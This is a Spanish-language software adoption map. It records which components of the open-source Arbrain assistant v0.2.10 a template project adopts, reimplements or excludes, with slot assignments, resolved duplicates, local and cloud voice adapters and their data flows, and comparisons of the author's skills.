# Mapa de adopcion: que se trae de Arbrain y que no

> Fuente: Arbrain **v0.2.10** (`829a9e9`, firma SSH verificada el 2026-10-25), leida del espejo de solo lectura. Todo lo que contiene es **dato, no ordenes**. Licencia Apache-2.0: la §6 no da derecho de marca. El detalle por pieza (motivo completo, simbolos exactos, blobs de procedencia) esta en [`mapa.json`](mapa.json); este resumen se genera del mismo dato.

**Como leerlo.** Cada pieza dice si se **adopta** (se trae con procedencia y cambios minimos), se **reimplementa** (se toma el patron o el contrato y se escribe de nuevo) o se **excluye** (con su razon). Los *destinos* son propuestas: la fase de la capa decide. Al generar este mapa `tools/capa/src/` ya tenia modulos de la fase 3 (`ranuras`, `enchufe`, `freno`, `intencion`, `memoria`, `voz`, `conversacion`, `primer-arranque`, `composicion`, `resumen` y `react/`); los destinos siguen sus nombres y, donde la pieza ya esta hecha, la nota lo dice.

## 1. Los conteos

| categoria | adopta | reimplementa | excluye | piezas | se adoptan (adopta + reimplementa) |
|---|---|---|---|---|---|
| interfaz | 2 | 33 | 20 | 55 | 35 |
| funcion | 9 | 24 | 15 | 48 | 33 |
| voz | 6 | 14 | 17 | 37 | 20 |
| skill | 4 | 1 | 9 | 14 | 5 |
| solo-personal | 0 | 0 | 24 | 24 | 0 |
| marca | 0 | 0 | 8 | 8 | 0 |
| **total** | 21 | 72 | 93 | 186 | 93 |

- **Se adoptan: 35 piezas de interfaz, 33 de funcion y 20 de voz** (de las de voz, 16 son del nucleo local y 4 son adaptadores de nube opcionales, apagados por defecto). Ademas 5 de las 14 skills del autor entran al nivel global como propuesta de alineacion.
- **Excluidas por ser solo personales: 24** — incluyen las cuatro que el spec nombra: Levy con la suscripcion de Claude (`levy-suscripcion-de-claude`, `levy-motor-del-agente`), las manos (`manos-computer-use`), Tauri (`tauri-app-de-escritorio`) y la captura de conversaciones (`captura-de-conversaciones`), mas el recall por hook (`hooks-de-contexto-del-autor`) y la vida del dueño: finanzas, salud, cohorte, masterclass, contenido, negocio, rutinas, habitos, biblioteca y las cuatro salas del cerebro.
- **Excluidas por marca: 8** — nombre «Arbrain» en textos y metadatos, la persona Levy, su cara (2D/3D), retratos y agentes, logo e iconos, el morado y el oro, la tipografia y las voces por agente.
- **Duplicados resueltos: 12** (seccion 3), cada uno con la ranura y quien la llena.
- **Cobertura del mapa: 1.918 de 1.918 archivos de codigo de Arbrain** (270.344 de 270.344 lineas) caen en alguna pieza. Un archivo puede citarse en dos piezas cuando una excluye el mecanismo y otra reimplementa la idea (por ejemplo `memory-recall.py`: el hook se excluye, el algoritmo se reimplementa).

### Por ranura

| ranura | adopta | reimplementa | excluye | duplicados que la tocan |
|---|---|---|---|---|
| **conversacion** | 3 | 12 | 5 | conversacion-de-la-mesa |
| **lienzo** | 0 | 4 | 1 | — |
| **explorador** | 1 | 3 | 2 | — |
| **panel** | 1 | 7 | 2 | pwa-y-push |
| **plan** | 1 | 2 | 1 | calendario |
| **voz** | 6 | 11 | 17 | voz, centro-de-mando-y-cabina |
| **memoria** | 0 | 4 | 3 | conocimiento-y-memoria, memory-manager |
| **freno** | 2 | 8 | 2 | gobernanza |
| **primer-arranque** | 0 | 3 | 2 | — |
| **ajustes** | 2 | 10 | 2 | contabilidad-y-modelo, ajustes |
| **intencion** | 0 | 3 | 1 | — |

Piezas sin ranura (skills, solo personales, marca y piezas transversales de gobernanza o tokens): 65.

### Orden sugerido: prioridad alta (adopta o reimplementa)

| pieza | decision | ranura | destino propuesto |
|---|---|---|---|
| `cabina-vistas-vivas` | reimplementa | lienzo | `tools/capa/src/react/lienzo.tsx` |
| `panel-pestanas-fijadas` | reimplementa | panel | `tools/capa/src/react/ventana.tsx` |
| `chat-hilo-y-compositor` | reimplementa | conversacion | `tools/capa/src/react/hilo.tsx` |
| `primer-arranque-pasos` | reimplementa | primer-arranque | `tools/capa/src/primer-arranque.ts` |
| `primer-arranque-bienvenida-y-pedidos` | reimplementa | primer-arranque | `tools/capa/src/primer-arranque.ts` |
| `ui-tokens-neutros` | reimplementa | ajustes | `tools/capa/src/react/estilos.ts` |
| `freno-dialogo-de-confirmacion` | reimplementa | freno | `tools/capa/src/react/freno.tsx` |
| `cabina-contrato-mostrar-abrir` | reimplementa | lienzo | `tools/capa/src/cabina.ts` |
| `explorador-reglas-de-acceso` | reimplementa | explorador | `tools/capa/src/explorador.ts` |
| `chat-html-aislado` | adopta | conversacion | `tools/capa/src/seguridad-render.ts` |
| `chat-imagen-remota-bloqueada` | adopta | conversacion | `tools/capa/src/seguridad-render.ts` |
| `freno-confirmaciones-con-huella` | reimplementa | freno | `tools/capa/src/freno.ts` |
| `freno-literal-visible-y-clic-humano` | adopta | freno | `tools/capa/src/freno.ts` |
| `freno-cita-textual-del-dueno` | reimplementa | freno | `tools/capa/src/freno.ts` |
| `freno-acciones-declaradas-por-el-modulo` | reimplementa | freno | `tools/capa/src/enchufe.ts` |
| `freno-cuanto-pregunta-tres-modos` | reimplementa | primer-arranque | `tools/capa/src/primer-arranque.ts` |
| `intencion-contrato-operar-hablando` | reimplementa | intencion | `tools/capa/src/intencion.ts` |
| `intencion-enrutador-lexico` | reimplementa | intencion | `tools/capa/src/intencion.ts` |
| `aviso-licencia-y-notice` | adopta | — | `tools/capa/NOTICE` |
| `capas-autor-y-alumno` | reimplementa | — | `tools/capa/mapa.json` |
| `actualizacion-con-firma-primero` | reimplementa | — | `scripts/capa/firma.mjs` |
| `actualizacion-revisar-lo-que-corre-solo` | reimplementa | — | `scripts/capa/revisa-actualizacion.mjs` |
| `voz-acuse-inmediato` | reimplementa | voz | `tools/capa/src/acuse.ts` |
| `voz-voz-del-dispositivo` | adopta | voz | `tools/capa/src/voz-dispositivo.ts` |
| `voz-probar-llave` | reimplementa | ajustes | `tools/capa/src/voz.ts` |
| `voz-stt-que-no-se-apaga` | adopta | voz | `tools/capa/src/voz-stt.ts` |
| `voz-contrato-openai` | reimplementa | voz | `tools/dictado/servicio/openai.mjs` |
| `voz-texto-que-no-se-oye` | adopta | voz | `tools/capa/src/voz-texto.ts` |
| `voz-lector-escuchar-ui` | reimplementa | conversacion | `tools/capa/src/react/escuchar.tsx` |
| `voz-dictar-en-el-chat` | reimplementa | voz | `tools/capa/src/react/voz.tsx` |
| `voz-permiso-del-microfono` | reimplementa | voz | `tools/capa/src/react/voz.tsx` |
| `skill-actualizar-arbrain` | reimplementa | — | `.claude/skills/actualizar-capa/SKILL.md` |

## 2. Lo que cambia lo que el spec daba por hecho

1. **Live y el acuse NO viajan en la edicion cliente de Arbrain, y Live ya no tiene boton.** chat/page.tsx: «Edicion cliente: ni Live ni Consejo»; /live/speech esta en RUTAS_SOLO_DANIEL; «Live sigue vivo en /chat?tab=live, sin boton: Daniel no lo usa (1 oct)». El acuse solo corre con LIVE_DOS_CAPAS=1 y OPENROUTER_API_KEY. Se toma el PATRON del acuse, no un comportamiento que el alumno vea hoy.
2. **Arbrain v0.2.10 no tiene Modo conversacion manos libres.** LiveWorkspace.tsx dice «Toca el microfono para dictar · revisa y da Enter». SpeechEndpoint (fin de frase, especulacion, interrupcion) no tiene consumidor: solo lo importa tests/live/endpoint.test.ts. El Modo conversacion es de ESTE template (skill dictado «conversa conmigo» + bucle-voz) y la capa ya lo modela; de Arbrain solo vienen los estados y el subtitulo accesible.
3. **KOKORO_TTS_URL: la edicion cliente NO lo lee (resuelve el «sin verificar» del spec).** Solo lo leen config.ts y voice.ts › synthesizeSpeech, y server.ts › POST /tts hace `if (esEdicionCliente())` → hablarLemonfox y return ANTES de llegar ahi. Ademas el servicio «voz-agentes» y sayd.swift NO estan en el repo publicado.
4. **tools/capa/src/voz.ts cita mal una procedencia.** Dice «Kokoro (KOKORO_TTS_URL, server/src/live/speech.ts)»: live/speech.ts es la voz de Apple (macOS); Kokoro/KOKORO_TTS_URL esta en arbrain/server/src/voice.ts y config.ts.
5. **El servicio de tools/dictado NO es OpenAI-compatible hoy.** servicio/servidor.mjs expone cuatro rutas: GET /health, POST /transcribir, GET /voces y POST /sintetizar (PCM16LE y cabeceras x-*). El enchufe /v1/audio/transcriptions y /v1/audio/speech es trabajo nuevo, y mp3 necesitaria un codificador (wav y pcm no).
6. **mejorVozEspanol puede elegir una voz de red.** Ordena primero «natural|neural|online|wavenet|enhanced|premium» y despues «google». Las «Online» de Edge y las «Google …» de Chrome son voces de red que mandan el TEXTO fuera; las «Natural» instaladas en Windows son locales, pero la funcion no las distingue (localService esta en su firma y no se usa). currentVoice() ademas la llama con todas las voces en español (`es`), no con el grupo `local` que acaba de calcular. Se adopta filtrando localService === true.
7. **«centro-de-mando ↔ cabina» son dos pares.** src/features/centro-de-mando ↔ features/command-center (HUD de voz del autor) y la capa ↔ features/cabina (vistas vivas + panel).
8. **La ranura `lienzo` de la capa no es el lienzo de Arbrain.** En la capa es «donde se pinta la pantalla del modulo» = la Cabina de Arbrain. El lienzo de dibujo (features/canvas, draw, draw3: ~38 mil lineas) es un modulo aparte y se excluye.
9. **Un solo choque de fondo con las reglas del template: «Quitar el freno».** modo-permisos.ts › fijarSinFreno deja enviar, borrar y publicar sin clic escribiendo una frase. El resto de «cuanto pregunta» se adopta; esta palanca no (limite de C5: dano a terceros no es firmable).
10. **El freno de Arbrain no se aprueba con el teclado.** esClicHumano exige isTrusted y detail > 0. Es correcto contra un Enter a destiempo, pero deja sin via de aprobacion a quien no usa raton: brecha de accesibilidad declarada, no resuelta.
11. **Skills: 6 de las 14 tienen copia local y NINGUNA es identica a la de Arbrain.** autoresearch, goal-compiler, memory-manager (3 copias); image-generation y knowledge-search (2: Arbrain y proyecto); sistema-viable (solo global). Las otras 8 no tienen copia en el proyecto ni en ~/.claude/skills.
12. **Cadencia: 11 versiones en 4 dias.** v0.2.0 a v0.2.10 entre el 21 y el 24/10. De ahi que lo adoptado lleve procedencia por archivo (git blob) en mapa.json: la skill de seguimiento compara esos blobs entre etiquetas y solo habla de lo que cambio EN LO ADOPTADO.

## 3. Duplicados resueltos: quien llena cada ranura

Regla: si el producto lleva el modulo nuestro, el nuestro llena la ranura; si no, la version de la capa. La ranura de voz no tiene version de la capa: no se llena sola con la nube.

| duplicado | nuestro | ranura | quien la llena | sin el modulo |
|---|---|---|---|---|
| **calendario** | `tools/calendario`, `src/features/laboratorio-calendario`, `scripts/calendario` | plan | tools/calendario (su ./react: Agenda, EditorDeEvento, SelectorDeHuecos, IndicadorDeSalud) cuando el producto lo lleva | la agenda minima de la capa: objetivos mes → semana → dia en la memoria del producto (ranuras.ts › FICHAS.plan.respaldo) |
| **voz** | `tools/dictado`, `tools/voz`, `tools/bucle-voz` (+3 mas en mapa.json) | voz | los motores LOCALES de tools/dictado (Parakeet int8, Piper es_MX) con tools/voz (Silero) y tools/bucle-voz; la capa pone el boton, «Escuchar», «Probar» y el acuse | nadie: la ranura de voz no se llena sola con la nube (RANURAS_SIN_RESPALDO); sin motor local declarado el boton no aparece o explica por que. Con solo la voz local del dispositivo queda «Escuchar», sin dictar ni Modo conversacion |
| **centro-de-mando-y-cabina** | `src/features/centro-de-mando`, `src/app/(main)/centro-de-mando` | voz | HUD de voz: el centro de mando del template (app de referencia de la ranura de voz). Vistas vivas y panel: la CAPA (cabina-vistas-vivas, panel-pestanas-fijadas), que no tiene equivalente en el template | sin el centro de mando la ranura de voz sigue siendo la de la capa; sin la capa no hay vistas vivas |
| **conocimiento-y-memoria** | `tools/conocimiento`, `tools/grafo-conocimiento` | memoria | la ranura de memoria la llena SIEMPRE la capa (MemoriaProducto por inquilino); tools/conocimiento y tools/grafo-conocimiento NO la llenan | la memoria de la capa en el almacen que declare el producto |
| **contabilidad-y-modelo** | `src/lib/ai/contabilidad.ts`, `src/lib/ai/routing.ts`, `.claude/routing-modelos.json` | ajustes | el template: routing por clase de tarea (C8) y contabilidad de tokens (coste null sin datos de uso, aviso al 80 %, corte lo decide la app) | n/a: el modelo y el gasto siempre son del template |
| **pwa-y-push** | `.claude/skills/add-mobile`, `src/shared/components/pwa-register.tsx` | panel | la skill add-mobile (PWA + push + iOS) cuando el producto la lleva | el panel de la capa muestra sus avisos sin sonido ni push |
| **ajustes** | `src/features/ajustes`, `src/features/historial` | ajustes | el modulo de ajustes de cada herramienta (hoy src/features/ajustes es el de tools/dictado) para SUS ajustes; la capa para cuanto pregunta, voz con «Probar» y memoria | los ajustes de la capa |
| **actualizacion** | `.claude/skills/update-sf` | — | update-sf sigue siendo la actualizacion del TEMPLATE; la skill nueva de seguimiento (propuesta: actualizar-capa) sigue a Arbrain para lo adoptado | n/a |
| **memory-manager** | `.claude/skills/memory-manager`, `.claude/memory` | memoria | la memoria del PROYECTO del laboratorio sigue siendo la nuestra (.claude/memory); la del producto es de la capa; la del Arbrain personal es suya y ningun producto la lee | n/a |
| **autenticacion** | `.claude/skills/add-login`, `src/features/auth` | — | add-login (Supabase + RLS por dueño) | n/a |
| **conversacion-de-la-mesa** | `src/features/soporte-sap/components/sala-chat.tsx`, `docs/MESA-DEL-EXPERTO.md` | conversacion | la ranura de conversacion de la capa, con el asistente y la marca de Soporte SAP (el enrutador sin LLM resuelve «prueba este caso» y «¿por que dijiste no lo se?») | la conversacion de la capa con el enrutador de intencion sin LLM |
| **gobernanza** | `AGENTS.md`, `.claude/gobernanza` | freno | AGENTS.md y la gobernanza (C1–C8): el freno de la capa es el unico y no se reemplaza | n/a |

- **calendario**: tools/calendario es multi-calendario con espejo, pluma idempotente, series RRULE con DST, disponibilidad y reservas sin doble reserva, sin FullCalendar. El de Arbrain es de UN usuario sobre archivos de su cerebro.
- **voz**: Los motores y el bucle son lo mejor medido de los dos lados (orden p50 644 ms, «para» 16/16, eco 0/6); de Arbrain se toma la experiencia de la ranura y cuatro piezas puntuales.
- **centro-de-mando-y-cabina**: CORRECCION AL SPEC: el par «centro-de-mando ↔ cabina» son dos pares. src/features/centro-de-mando se rehizo desde el command-center de business-os (MIT) y es el gemelo del HUD de voz `features/command-center` de Arbrain; la cabina (vistas vivas dentro de la conversacion + panel) es otra cosa y la llena la capa.
- **conocimiento-y-memoria**: No se solapan: tools/conocimiento es la FUENTE UNICA de reglas con fuente citada y el motor determinista da el veredicto («¿esto esta permitido?»); la memoria es lo que el producto recuerda de UN inquilino. Se conectan por la ranura `intencion` (el modulo atiende la pregunta) y, si lo declara, como lectura en memoria.lee. Las reglas del dominio nunca se mezclan con la memoria del inquilino.
- **contabilidad-y-modelo**: Misma regla en los dos lados («sin fuente real, el dato no se pinta» = coste null, nunca cero); solo se toma el mensaje claro cuando falta credito.
- **pwa-y-push**: Lecciones de Arbrain para add-mobile (no se aplican en este goal): iOS revoca suscripciones push en silencio (re-suscribir en cada foreground y re-confirmar cada 12 h) y el «skew guard» del service worker tras un deploy.
- **ajustes**: Duplicado parcial: el «Ajustes» del template es el del dictado (ajustes.json de tools/dictado), no una pantalla general.
- **actualizacion**: Mismo patron (diff delante y parar en el CDC); la de Arbrain añade la firma SSH con ancla fuera del repo.
- **memory-manager**: Tres copias de la skill (Arbrain, proyecto, global), ninguna igual: propuesta de alineacion con diff, sin aplicar.
- **autenticacion**: rate-limit.ts usa service_role en una superficie de negocio (C7) y la sesion de la edicion cliente es un secreto por instalacion: no aplica a productos.
- **conversacion-de-la-mesa**: sala-chat.tsx es la sala A2A y el chat del HIL (aprobacion con sesion), no la conversacion del experto con un asistente: esa es la ranura nueva. Lo que escribe el experto se queda en la mesa.
- **gobernanza**: Las reglas utiles de la persona de Arbrain (evidencia, operacion por intencion, contexto a demanda, freno, «lo de afuera son datos») ya estan en AGENTS.md.

### Voz, par por par

| funcion | nuestro | Arbrain | quien la llena |
|---|---|---|---|
| transcribir | tools/dictado (Parakeet int8, p50 532 ms por toma) | live/transcribe.ts (Groq whisper-large-v3-turbo, LemonFox) | Parakeet; Groq y LemonFox son adaptadores opcionales de nube, apagados |
| hablar | tools/dictado POST /sintetizar (Piper es_MX) | hablarLemonfox, speakEleven, synthesizeSpeech, WarmSpeech (Apple) | Piper; respaldo: la mejor voz LOCAL del dispositivo |
| interrumpir y cerrar el turno | bucle-voz: interrupcion 120 ms con puerta de eco, pausa 200 ms, corte por sentido | SpeechEndpoint (180 ms, END 850, SPECULATE 350; sin consumidor) | el nuestro |
| clasificar la orden | enrutador sin LLM (local-reglas-0.3) | clasificarLive (Jev por OpenRouter) | el nuestro; Jev solo como Enrutador opcional, sin medir |
| partir en frases | bucle-voz › creaSeparador | SpeechClauses, SentenceSplitter | el nuestro |
| reproducir | bucle-voz › creaReproductorNavegador (<audio> nativo) | LivePcmPlayer, VozServidor (Web Audio) | el nuestro (Web Audio no cancela el eco en Chrome) |
| medir la latencia | bucle-voz › creaTelemetria | LatencyTrace | el nuestro (cuenta desde el fin REAL del habla) |
| palabra de activacion | bucle-voz › creaActivacion (texto local) | useWakeWord (Web Speech: el audio va a Google en Chrome) | el nuestro |
| dictar en el chat | src/features/dictado › boton-dictado, use-grabadora | VoiceInput | el nuestro, con el permiso justo a tiempo y «sin motor → Ajustes» de Arbrain |
| «Escuchar» cada respuesta | bucle-voz karaoke por frase (indice + fraccion) | chat-speech, lector-filtro, voz-servidor, lector-posicion | la capa, con piezas de Arbrain sobre el motor de la ranura |
| «Probar» | salud del servicio (GET /health) | probarLlaveVoz (GET /models) | la capa; con motor local prueba el servicio, con nube prueba la llave sin gastar cuota |
| dictar desde el telefono | src/features/dictado: QR + token propio contra el servicio local | VoiceInput en /telefono con Groq | el nuestro |

## 4. Voz: lo que se importa, lo que queda en la nube y lo que se conserva

### 4.1 Lo que se IMPORTA (con archivo y funcion exactos de origen)

| las cuatro pedidas | decision | origen exacto (archivo › funcion) | destino |
|---|---|---|---|
| **Acuse inmediato** (`voz-acuse-inmediato`) | reimplementa | `server/src/live/capa-rapida.ts` › `ACUSES`, `ESTADO`, `acuseDe`, `UMBRAL_RUTA`, `LIVE_DOS_CAPAS_CONTEXT`; `server/src/chat-runtime/chat-job.ts` › `acuseDe`, `live_ack`, `live_status`; `src/features/live/hooks/useLiveVoice.ts` › `speakAck`; `src/features/live/components/LiveWorkspace.tsx` › `live_ack`, `speakAck` | tools/capa/src/acuse.ts |
| **Mejor voz del dispositivo** (`voz-voz-del-dispositivo`) | adopta | `src/features/chat/lib/chat-speech.ts` › `mejorVozEspanol`, `indiceDeVelocidad`, `vozNoAcelera`, `currentVoice` | tools/capa/src/voz-dispositivo.ts |
| **Probar una llave sin gastar cuota** (`voz-probar-llave`) | reimplementa | `server/src/cliente/voz.ts` › `probarLlaveVoz`, `PruebaVoz`; `server/src/server.ts` › `/voz/probar` | tools/capa/src/voz.ts |
| **STT que no se apaga** (`voz-stt-que-no-se-apaga`) | adopta | `server/src/live/transcribe.ts` › `speechProviders`, `transcribe`, `TranscriptionError`, `audioFilename`; `tests/live/transcribe.test.ts` › `uses already configured Lemonfox when Groq is absent` | tools/capa/src/voz-stt.ts |

Y otras piezas de voz que se importan porque la ranura las necesita:

| pieza | decision | origen exacto | destino |
|---|---|---|---|
| `voz-contrato-openai` | reimplementa | `server/src/live/transcribe.ts` › `speechProviders`; `server/src/cliente/voz.ts` › `hablarLemonfox`, `SPEECH`; `server/src/voice.ts` › `synthesizeSpeech` | tools/dictado/servicio/openai.mjs |
| `voz-texto-que-no-se-oye` | adopta | `src/features/chat/lib/lector-filtro.ts` › `URL_RE`, `esEncabezadoFuentes`, `pareceTabla`, `sinUrls`, `filtrarBloques`, `bloquesDeMarkdown`, `markdownHablable` | tools/capa/src/voz-texto.ts |
| `voz-texto-hablado` | adopta | `src/features/chat/lib/chat-speech.ts` › `buildSpoken`, `NOISE` | tools/capa/src/voz-texto.ts |
| `voz-tiempos-de-palabras` | adopta | `src/features/chat/lib/voz-servidor.ts` › `tiemposDePalabras`, `silenciosDe`, `tiemposDelAudio`, `palabraEn` | tools/capa/src/voz-tiempos.ts |
| `voz-posicion-del-lector` | adopta | `src/features/chat/lib/lector-posicion.ts` › `MemoriaLector`, `resolverPosicion`, `huellaDeTexto`, `CLAVE`, `TOPE`; `src/features/chat/lib/lector-bloques.ts` › `tramosPropios`, `SELECTOR_BLOQUES` | tools/capa/src/voz-lector.ts |
| `voz-lector-escuchar-ui` | reimplementa | `src/features/chat/components/AudioButton.tsx` › `AudioButton`; `src/features/chat/components/ChatSpeechBar.tsx` › `ChatSpeechBar`; `src/features/chat/components/GlobalAudioBar.tsx` › `GlobalAudioBar`; `src/features/chat/components/LectorPosicion.tsx` › `LectorPosicion`; `src/features/chat/components/AudioBarChrome.tsx` › `AudioBarFrame`; `src/features/chat/lib/chat-speech.ts` › `ChatSpeechController`, `chatSpeech` | tools/capa/src/react/escuchar.tsx |
| `voz-dictar-en-el-chat` | reimplementa | `src/features/chat/components/VoiceInput.tsx` › `VoiceInput`, `onSinConfigurar`, `soloTexto` | tools/capa/src/react/voz.tsx |
| `voz-permiso-del-microfono` | reimplementa | `src/features/permisos/lib/permisos.ts` › `asegurarPermiso` | tools/capa/src/react/voz.tsx |
| `voz-estado-del-motor` | reimplementa | `src/features/chat/lib/voz-cliente.ts` › `daemonTieneLlaveVoz`, `useLlaveVoz` | tools/capa/src/react/voz.tsx |
| `voz-ajustes-voz` | reimplementa | `src/features/primer-arranque/components/PanelVoz.tsx` › `PanelVoz` | tools/capa/src/react/ajustes-voz.tsx |
| `voz-estados-del-modo-conversacion` | reimplementa | `src/features/live/hooks/useLiveVoice.ts` › `LiveVoiceState`; `src/features/live/components/LiveWorkspace.tsx` › `labels`, `aria-live` | tools/capa/src/voz.ts |
| `voz-medir-adaptadores` | reimplementa | `server/src/live/stt-bench.ts` › `cases`, `summary` | scripts/capa/mide-adaptadores.mjs |

### 4.2 Adaptadores de NUBE opcionales (apagados por defecto, detras de la misma interfaz OpenAI-compatible; cada uno declara que sale)

| adaptador | decision | que sale de la maquina (C4) | origen |
|---|---|---|---|
| `voz-nube-groq-stt` | reimplementa | **audio** → Groq (api.groq.com/openai/v1/audio/transcriptions) | `server/src/live/transcribe.ts` › `speechProviders` |
| `voz-nube-lemonfox-stt` | reimplementa | **audio** → LemonFox (api.lemonfox.ai/v1/audio/transcriptions) | `server/src/live/transcribe.ts` |
| `voz-nube-lemonfox-tts` | reimplementa | **texto** → LemonFox (api.lemonfox.ai/v1/audio/speech): el texto de cada respuesta que se escucha | `server/src/cliente/voz.ts` › `hablarLemonfox`, `VOZ_LEMONFOX`, `SPEECH`; `src/app/api/chat/tts/route.ts` › `ttsCliente`, `tempoLector` |
| `voz-nube-elevenlabs-tts` | reimplementa | **texto** → ElevenLabs (api.elevenlabs.io/v1/text-to-speech): la frase y los ultimos 300 caracteres previos (previous_text) | `src/features/live/server/elevenlabs.ts` › `speakEleven`, `warmEleven`, `classifyFailure`, `elevenBlocked`, `FIRST_BYTE_BUDGET_MS`; `src/app/api/chat/tts-fast/route.ts` › `POST`, `EL_MODEL` |
| `voz-nube-jev-clasificador` | excluye | **texto** → OpenRouter (openrouter.ai/api/alpha/decisions) | `server/src/live/capa-rapida.ts` › `clasificarLive`, `capaRapidaActiva`, `esfuerzoParaOpus` |
| `voz-nube-reconocimiento-del-navegador` | excluye | **audio** → el proveedor del navegador (en Chrome, Google) | `src/features/command-center/hooks/useWakeWord.ts` |

Ninguno esta medido aqui: se declaran **no medidos** y se prueban contra un proveedor simulado. Nunca se encienden en un producto con datos sensibles de terceros (pacientes, por ejemplo). El reconocimiento de voz del navegador cuenta como nube (en Chrome manda el audio a Google). `mejorVozEspanol` puede elegir una voz de red si no se filtra por `localService`.

### 4.3 Lo que se CONSERVA nuestro

| pieza de Arbrain que no entra | por que | se queda |
|---|---|---|
| `voz-interrupcion-y-cierre-de-turno` | SpeechEndpoint: fin de frase a 850 ms, especulacion a 350 ms, interrupcion tras 180 ms de voz sobre un umbral de nivel (0,095 hablando la maquina / 0,035 callada), SIN puerta de eco. | `tools/bucle-voz/src/interrupcion.ts`, `tools/bucle-voz/src/oido.ts`, `tools/bucle-voz/src/cierre.ts` |
| `voz-parada-por-voz` | isStopUtterance: /^(levy[, ]+)?(para\|detente\|silencio\|alto\|espera)/ lleva el nombre de la persona del autor. | `tools/bucle-voz/src/control.ts`, `tools/bucle-voz/src/catalogo.ts` |
| `voz-telemetria-de-latencia` | LatencyTrace: marcas voiceEnd → endpoint → sttDone → send → firstToken → firstSentence → firstByte → firstSound. | `tools/bucle-voz/src/telemetria.ts` |
| `voz-separador-de-frases` | SpeechClauses (primer trozo de 14 caracteres o ~5 palabras, luego 65) y SentenceSplitter del HUD. Nuestro separador avanza por posicion y no parte decimales, miles, horas, abreviaturas ni iniciales. | `tools/bucle-voz/src/separador.ts` |
| `voz-reproductor-web-audio` | LivePcmPlayer (PCM por Web Audio con cola y cancelacion) y VozServidor (audio por parrafo con precarga de 3 tramos) | `tools/bucle-voz/src/navegador/reproductor.ts`, `tools/bucle-voz/src/canal-voz.ts` |
| `voz-pcm-y-nivel` | PcmDecoder y rms (decodificar s16le por trozos desalineados, nivel). Ya los cubren el PCM/WAV y el nivel en dB de bucle-voz y voz. | `tools/bucle-voz/src/audio.ts`, `tools/voz/src/audio` |
| `voz-hud-command-center` | HUD de voz del autor (orbe, onda, subtitulos karaoke, telemetria, useVoiceLoop de 578 lineas, audio-engine de 346) | `src/features/centro-de-mando`, `tools/bucle-voz` |
| `voz-vad-y-diarizacion` | Arbrain no trae VAD propio (mide nivel RMS contra un umbral). Nuestro VAD Silero (tambien en el navegador), energia calibrada y diarizacion estan en tools/voz. | `tools/voz/src/vad`, `tools/voz/src/diar` |
| `voz-dictado-desde-el-telefono` | Dictar desde el teléfono: Arbrain usa el micrófono del navegador del teléfono (VoiceInput) con la llave de Groq en el daemon de la computadora y entra por la red privada de Tailscale. | `src/features/dictado/components/qr-emparejar.tsx`, `src/features/dictado/components/boton-flotante-movil.tsx`, `src/features/dictado/services/enlace-emparejar.ts`, `src/features/dictado/hooks/use-grabadora.ts`, `docs/DICTADO-CELULAR-RED.md` |
| `voz-enrutador-sin-llm` | Arbrain no resuelve ordenes de voz en local: el acuse lo elige un clasificador con modelo (Jev) y los comandos de la paleta «/» son del Agent SDK. Nuestro enrutador sin LLM resuelve callar, repetir, velocidad, hora y agenda en local (orden p50 644 ms)… | `tools/bucle-voz/src/enrutador.ts`, `tools/bucle-voz/src/catalogo.ts`, `tools/bucle-voz/src/control.ts` |

### 4.4 Lo que no se trae por otras razones

- `voz-nube-kokoro-voz-agentes` (plataforma): TTS por KOKORO_TTS_URL (default http://127.0.0.1:8880) con VOZ_TOKEN: el servicio «voz-agentes» del Studio del autor, fuera del repo.
- `voz-apple-juan-macos` (plataforma): WarmSpeech: voz de Apple por un proceso Swift (sayd) que se compila con swiftc; exige macOS. El fuente sayd.swift NI SIQUIERA ESTA en el repo publicado (arbrain/server/services/live-voice/ no existe en v0.2.10): no se podria adoptar aunque se quisiera.
- `voz-espacio-visual-de-live` (personal): Espacio visual de Live (el asistente compone piezas y graficas con la herramienta `workspace`), lecturas de datos del negocio (ventas, contenido, radar) y camara.
- `voz-pizarron-con-voz` (modulo-aparte): Pizarron donde el asistente ensena conversando (voz sincronizada palabra por palabra con lo que traza)
- `voz-diagnostico-del-lector` (no-aplica): Sonda temporal del hilo principal para cazar por qué se desincroniza el lector («TEMPORAL: cuando el culpable este identificado y arreglado, esto se borra entero»).

## 5. Skills del autor (nivel global, solo lectura de `~/.claude/skills`)

Hash = sha256 (16 hex) del manifiesto de archivos de la carpeta; entre parentesis, cuantos archivos. **Ninguna copia local es identica a la de Arbrain.** Alinear es una propuesta con diff, sin aplicar, y es un CDC (C1).

| skill | Arbrain | proyecto | global | estado | decision |
|---|---|---|---|---|---|
| **actualizar-arbrain** | `cf4f399c6a26ca70` (2) | — | — | solo en arbrain | reimplementa |
| **artificial-brain** | `bc6df7f06470a67b` (17) | — | — | solo en arbrain | excluye |
| **autoresearch** | `da514409a4c944f8` (3) | `b4b752671f77d670` (1) | `33a81b01c8ea84c7` (4) | difiere en proyecto y global de arbrain | adopta |
| **bajar-a-tierra** | `2e4400da73c739ef` (4) | — | — | solo en arbrain | excluye |
| **canvas** | `88b6bc4435ee9e9e` (1) | — | — | solo en arbrain | excluye |
| **edicion-por-voz** | `ef4fbaa876123e1b` (1) | — | — | solo en arbrain | excluye |
| **goal-compiler** | `369fe76568ef2e46` (7) | `9d885923efc5363f` (5) | `ac3ce94466c82427` (5) | difiere en proyecto y global de arbrain | adopta |
| **habit-system** | `d5aec85c91156c54` (10) | — | — | solo en arbrain | excluye |
| **image-generation** | `61b753ce52ca0c14` (2) | `8ff5e948f499e7c2` (2) | — | difiere en proyecto de arbrain | excluye |
| **knowledge-search** | `e0c92ac467e9c86c` (1) | `6f7d4937ba79bcd5` (2) | — | difiere en proyecto de arbrain | excluye |
| **libro-os** | `5aa0ae4a08f61fd5` (2) | — | — | solo en arbrain | excluye |
| **memory-manager** | `8f313441ece50a0b` (1) | `13187123471cfe0d` (1) | `caab00a6148a73e0` (2) | difiere en proyecto y global de arbrain | adopta |
| **os-audit** | `d340043976de07a2` (3) | — | — | solo en arbrain | excluye |
| **sistema-viable** | `2119ee29793aa971` (4) | — | `85b670e5ff613dc5` (4) | difiere en global de arbrain | adopta |

- **autoresearch**: SKILL.md: Arbrain→proyecto +96/-78, Arbrain→global +21/-21 (eval-guide +9/-9, loop-protocol +3/-3), proyecto→global +78/-95. La del proyecto no trae references/ y la global trae README-PAQUETE.md.
- **goal-compiler**: Arbrain→proyecto: SKILL.md +26/-73, loop-vs-grafo +6/-6, goal-mechanics +1/-1, grafo2plan.py +10/-39 (lo mismo contra la global). La del proyecto lleva el DIAGNOSTICO DE FORMA loop-vs-grafo y aprendizajes propios: el diff decide que se queda.
